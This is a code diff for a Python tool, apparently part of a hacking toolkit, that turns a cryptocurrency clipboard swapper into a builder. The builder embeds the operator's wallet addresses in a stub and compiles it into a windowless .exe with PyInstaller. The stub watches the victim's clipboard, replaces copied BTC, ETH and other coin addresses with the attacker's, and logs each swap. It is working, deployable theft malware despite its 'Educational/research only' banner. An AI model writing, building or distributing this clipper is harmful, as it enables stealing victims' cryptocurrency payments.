@@ -1,10 +1,9 @@
-"""Crypto Clipper — Cryptocurrency address clipboard monitor and swapper."""
+"""Crypto Clipper Builder — Build standalone crypto clipboard swapper .exe"""
 
 import os
 import sys
 import time
-import re
-import threading
+import subprocess
 
 try:
     from kevbin import clear, cprint, prompt, pause
@@ -20,139 +19,224 @@ except ImportError:
     def pause():
         prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()
 
-WALLET_PATTERNS = {
-    'BTC': re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{25,90}$'),
-    'ETH': re.compile(r'^0x[a-fA-F0-9]{40}$'),
-    'LTC': re.compile(r'^[LM][a-km-zA-HJ-NP-Z1-9]{26,34}$'),
-    'XRP': re.compile(r'^r[1-9A-HJ-NP-Za-km-z]{24,34}$'),
-    'DOGE': re.compile(r'^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$'),
-    'SOL': re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'),
-    'DASH': re.compile(r'^X[a-km-zA-HJ-NP-Z1-9]{33}$'),
-    'BCH': re.compile(r'^bitcoincash:q[a-z0-9]{41}$|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'),
-}
+CLIPPER_STUB = r'''
+import os, sys, time, re, subprocess
+from datetime import datetime
 
-clip_log = []
-clip_lock = threading.Lock()
+DEBUG = {debug}
+LOG_FILE = os.path.join(os.getenv("APPDATA", "."), "clip_log.txt")
 
-def _detect_wallet(text):
-    text = text.strip()
-    for coin, pattern in WALLET_PATTERNS.items():
-        if pattern.match(text):
-            return coin
-    return None
+def dprint(msg):
+    if DEBUG:
+        try:
+            with open(os.path.join(os.getenv("APPDATA", "."), "clip_debug.txt"), "a") as f:
+                f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{msg}}\n")
+        except: pass
 
-def _get_clipboard():
+COINS = {{
+    "BTC": r"^[13][a-km-zA-HJ-NP-Z1-9]{{25,34}}$|^bc1[a-zA-HJ-NP-Z0-9]{{25,90}}$",
+    "ETH": r"^0x[a-fA-F0-9]{{40}}$",
+    "LTC": r"^[LM][a-km-zA-HJ-NP-Z1-9]{{26,34}}$",
+    "XRP": r"^r[1-9A-HJ-NP-Za-km-z]{{24,34}}$",
+    "DOGE": r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$",
+    "SOL": r"^[1-9A-HJ-NP-Za-km-z]{{32,44}}$",
+    "DASH": r"^X[a-km-zA-HJ-NP-Z1-9]{{33}}$",
+    "BCH": r"^bitcoincash:q[a-z0-9]{{41}}$|^[13][a-km-zA-HJ-NP-Z1-9]{{25,34}}$",
+}}
+
+REPLACEMENTS = {{re.compile(pat): (coin, addr) for coin, pat, addr in [
+{replacements}
+]}}
+
+dprint(f"Loaded {{len(REPLACEMENTS)}} coin replacements")
+
+def get_clip():
     try:
-        import subprocess
-        result = subprocess.run(['powershell', '-NoProfile', '-Command', 'Get-Clipboard'],
-                                capture_output=True, text=True, timeout=5)
-        return result.stdout.strip()
-    except:
+        r = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
+                           capture_output=True, text=True, timeout=5)
+        val = r.stdout.strip()
+        dprint(f"Clipboard read: {{val[:40]}}")
+        return val
+    except Exception as e:
+        dprint(f"Clipboard read error: {{e}}")
         return ""
 
-def _set_clipboard(text):
+def set_clip(text):
     try:
-        import subprocess
-        subprocess.run(['powershell', '-NoProfile', '-Command', f'Set-Clipboard -Value "{text}"'],
+        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{{text}}"'],
                        capture_output=True, timeout=5)
-        return True
-    except:
-        return False
+        dprint(f"Clipboard set: {{text[:40]}}")
+    except Exception as e:
+        dprint(f"Clipboard set error: {{e}}")
 
-def _monitor(replacements, stop_flag, notify):
+def detect(text):
+    text = text.strip()
+    for coin, pat in COINS.items():
+        if re.match(pat, text):
+            for regex, (c, addr) in REPLACEMENTS.items():
+                if c == coin and addr and text != addr:
+                    dprint(f"DETECTED {{coin}}: {{text[:30]}} -> {{addr[:30]}}")
+                    return coin, addr
+    return None, None
+
+def log_swap(coin, orig, repl):
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{coin}}: {{orig[:30]}} -> {{repl[:30]}}\n")
+        dprint(f"Swap logged to {{LOG_FILE}}")
+    except Exception as e:
+        dprint(f"Log write error: {{e}}")
+
+def main():
+    dprint("Crypto clipper started")
     last = ""
-    while not stop_flag.is_set():
+    checks = 0
+    swaps = 0
+    while True:
         try:
-            current = _get_clipboard()
-            if current and current != last:
-                last = current
-                for coin, addr in replacements.items():
-                    if addr and current != addr:
-                        detected = _detect_wallet(current)
-                        if detected:
-                            _set_clipboard(addr)
-                            with clip_lock:
-                                clip_log.append({
-                                    "time": time.strftime('%H:%M:%S'),
-                                    "original": current[:40],
-                                    "replaced_with": addr[:40],
-                                    "coin": detected,
-                                })
-                            if notify:
-                                sys.stdout.write(f"\r  \033[92m[CLIP]\033[0m {detected} swapped: {current[:20]}... -> {addr[:20]}...\n")
-                                sys.stdout.flush()
-                            break
-        except Exception:
-            pass
+            cur = get_clip()
+            if cur and cur != last:
+                last = cur
+                checks += 1
+                coin, addr = detect(cur)
+                if coin:
+                    set_clip(addr)
+                    log_swap(coin, cur, addr)
+                    swaps += 1
+                    dprint(f"Total: {{checks}} checks, {{swaps}} swaps")
+        except Exception as e:
+            dprint(f"Main loop error: {{e}}")
         time.sleep(0.3)
 
+if __name__ == "__main__":
+    try:
+        dprint("=== CLIPPER LAUNCHED ===")
+        main()
+    except Exception as e:
+        dprint(f"FATAL: {{e}}")
+'''
+
+COINS_PAT = {
+    "BTC": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{25,90}$",
+    "ETH": r"^0x[a-fA-F0-9]{40}$",
+    "LTC": r"^[LM][a-km-zA-HJ-NP-Z1-9]{26,34}$",
+    "XRP": r"^r[1-9A-HJ-NP-Za-km-z]{24,34}$",
+    "DOGE": r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$",
+    "SOL": r"^[1-9A-HJ-NP-Za-km-z]{32,44}$",
+    "DASH": r"^X[a-km-zA-HJ-NP-Z1-9]{33}$",
+    "BCH": r"^bitcoincash:q[a-z0-9]{41}$|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
+}
+
+
+def _debug_print(title, msg):
+    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")
+
+
 def run(kevbin=None):
-    replacements = {c: "" for c in WALLET_PATTERNS}
+    debug_mode = False
     while True:
         clear()
-        cprint("  \033[93m\u2554" + "\u2550"*44 + "\u2557")
-        cprint("  \033[93m\u2551       CRYPTO CLIPPER                      \u2551")
-        cprint("  \033[93m\u255a" + "\u2550"*44 + "\u255d")
+        dbg_tag = " \033[91m[DEBUG ON]\033[0m" if debug_mode else ""
+        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
+        cprint(f"  \033[93m\u2551       CRYPTO CLIPPER BUILDER{dbg_tag}" + " "*(20-len(dbg_tag)) + "\u2551")
+        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
         cprint("  \033[91m[!] Educational/research only\033[0m")
         print()
-        cprint("  \033[97m[1]  Configure Replacement Addresses\033[0m")
-        cprint("  \033[97m[2]  Start Clip Monitor\033[0m")
-        cprint("  \033[97m[3]  View Swap Log\033[0m")
-        cprint("  \033[97m[4]  Test Wallet Detection\033[0m")
+        cprint("  \033[97m[1]  Build Clipper (.py)\033[0m")
+        cprint("  \033[97m[2]  Build Clipper (.exe)\033[0m")
+        cprint("  \033[97m[3]  View Stub Source\033[0m")
+        cprint("  \033[97m[4]  Toggle Debug Mode\033[0m")
         cprint("  \033[91m[0]  Back\033[0m")
-        print()
-        configured = sum(1 for v in replacements.values() if v)
-        if configured:
-            cprint(f"  \033[90m  {configured}/{len(replacements)} coins configured\033[0m")
         print()
         choice = prompt("\033[33m  choice > \033[0m")
         if choice == '0':
             return
-        elif choice == '1':
+        elif choice == '4':
+            debug_mode = not debug_mode
+            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
+            cprint(f"  Debug mode: {state}")
+            time.sleep(0.6)
+            continue
+        elif choice in ('1', '2'):
             clear()
-            cprint("  \033[93m┌── CONFIGURE ADDRESSES ─────────────────────┐\033[0m")
-            cprint("  \033[90mEnter your replacement address for each coin (empty to skip):\033[0m\n")
-            for coin in WALLET_PATTERNS:
-                current = replacements[coin]
-                marker = f"\033[92m(current: {current[:20]}...)\033[0m" if current else "\033[90m(not set)\033[0m"
-                addr = prompt(f"  \033[96m{coin}: \033[0m{marker} > ").strip()
+            cprint("  \033[93m\u2550"*54)
+            cprint("  \033[93m  CONFIGURE REPLACEMENT WALLETS\033[0m")
+            cprint("  \033[90m  Enter your wallet address for each coin (empty to skip)\033[0m")
+            cprint("  \033[93m\u2550"*54)
+            print()
+            replacements = []
+            for coin in ["BTC", "ETH", "LTC", "XRP", "DOGE", "SOL", "DASH", "BCH"]:
+                addr = prompt(f"  \033[96m{coin}: \033[0m").strip()
                 if addr:
-                    replacements[coin] = addr
-                    cprint(f"  \033[92m  [X] Set {coin} replacement\033[0m")
-        elif choice == '2':
-            if not any(replacements.values()):
-                cprint("  \033[91m[X] Configure addresses first\033[0m"); pause(); continue
-            clear()
-            cprint("  \033[93m┌── CLIP MONITOR ────────────────────────────┐\033[0m")
-            cprint("  \033[92m[*] Monitoring clipboard... Press Ctrl+C to stop\033[0m\n")
-            stop = threading.Event()
-            t = threading.Thread(target=_monitor, args=(replacements, stop, True), daemon=True)
-            t.start()
-            try:
-                while True:
-                    time.sleep(1)
-            except KeyboardInterrupt:
-                stop.set()
-                time.sleep(0.5)
+                    replacements.append((coin, addr))
+                    cprint(f"  \033[92m  [X] {coin} set\033[0m")
+                    if debug_mode:
+                        _debug_print("ADDR", f"{coin} = {addr[:20]}...")
+            if not replacements:
+                cprint("  \033[91m[X] No addresses configured\033[0m"); pause(); continue
+            print()
+            if debug_mode:
+                _debug_print("CONFIG", f"{len(replacements)} coins configured")
+            rep_lines = []
+            for coin, addr in replacements:
+                rep_lines.append(f'    ("{coin}", r"{COINS_PAT.get(coin, "")}", "{addr}"),')
+            rep_block = "\n".join(rep_lines)
+            stub = CLIPPER_STUB.replace("{replacements}", rep_block)
+            stub = stub.replace("{debug}", "True" if debug_mode else "False")
+            out = prompt("  \033[96mOutput filename (default: clipper.py): \033[0m").strip() or "clipper.py"
+            if not out.endswith('.py'): out += '.py'
+            if debug_mode:
+                _debug_print("STUB", f"Length: {len(stub)} bytes")
+                _debug_print("STUB", f"Replacements embedded: {len(replacements)}")
+            with open(out, 'w', encoding='utf-8') as f:
+                f.write(stub)
+            fsize = os.path.getsize(out)
+            cprint(f"  \033[92m[X] Saved: {out} ({fsize} bytes)\033[0m")
+            if debug_mode:
+                _debug_print("FILE", f"Written: {os.path.abspath(out)}")
+            if choice == '2':
+                exe_name = os.path.splitext(out)[0] + ".exe"
+                if debug_mode:
+                    _debug_print("BUILD", f"Target: dist/{exe_name}")
+                    _debug_print("BUILD", f"Source: {os.path.abspath(out)}")
+                    _debug_print("BUILD", f"Python: {sys.executable}")
+                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
+                try:
+                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
+                           '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
+                    if debug_mode:
+                        _debug_print("CMD", " ".join(cmd))
+                    result = subprocess.run(cmd, check=True, timeout=180,
+                                           capture_output=debug_mode, text=debug_mode)
+                    if debug_mode and result.stdout:
+                        for line in result.stdout.strip().split('\n')[-8:]:
+                            _debug_print("PYINST", line.strip())
+                    dist_path = os.path.join("dist", exe_name)
+                    if os.path.isfile(dist_path):
+                        esize = os.path.getsize(dist_path)
+                        cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
+                        if debug_mode:
+                            _debug_print("DONE", f"Full path: {os.path.abspath(dist_path)}")
+                    else:
+                        cprint(f"  \033[93m[?] Compiled but {dist_path} not found\033[0m")
+                except FileNotFoundError:
+                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
+                except subprocess.TimeoutExpired:
+                    cprint("  \033[91m[X] Build timed out (180s)\033[0m")
+                except subprocess.CalledProcessError as e:
+                    cprint(f"  \033[91m[X] Build failed: exit code {e.returncode}\033[0m")
+                    if debug_mode and e.stderr:
+                        for line in str(e.stderr).strip().split('\n')[-6:]:
+                            _debug_print("ERR", line.strip())
+                except Exception as e:
+                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
+                    if debug_mode:
+                        _debug_print("EXC", str(e))
         elif choice == '3':
             clear()
-            cprint("  \033[93m┌── SWAP LOG ────────────────────────────────┐\033[0m")
-            with clip_lock:
-                if not clip_log:
-                    cprint("  \033[90mNo swaps recorded\033[0m")
-                else:
-                    for e in clip_log:
-                        cprint(f"  \033[90m{e['time']}\033[0m \033[92m{e['coin']}\033[0m {e['original']}... -> {e['replaced_with']}...")
-                    cprint(f"\n  \033[97mTotal: {len(clip_log)} swap(s)\033[0m")
-        elif choice == '4':
-            clear()
-            cprint("  \033[93m┌── WALLET DETECTION TEST ───────────────────┐\033[0m")
-            addr = prompt("  \033[96mPaste an address: \033[0m").strip()
-            detected = _detect_wallet(addr)
-            if detected:
-                cprint(f"  \033[92m[X] Detected: {detected}\033[0m")
-            else:
-                cprint("  \033[93m[X] Not recognized as a known wallet format\033[0m")
+            stub = CLIPPER_STUB.replace("{replacements}", '    ("BTC", "^[13]...", "YOUR_BTC"),\n    ("ETH", "^0x...", "YOUR_ETH"),')
+            stub = stub.replace("{debug}", "False")
+            print(stub)
         else:
             cprint("  \033[91mInvalid choice\033[0m")
             time.sleep(0.5)
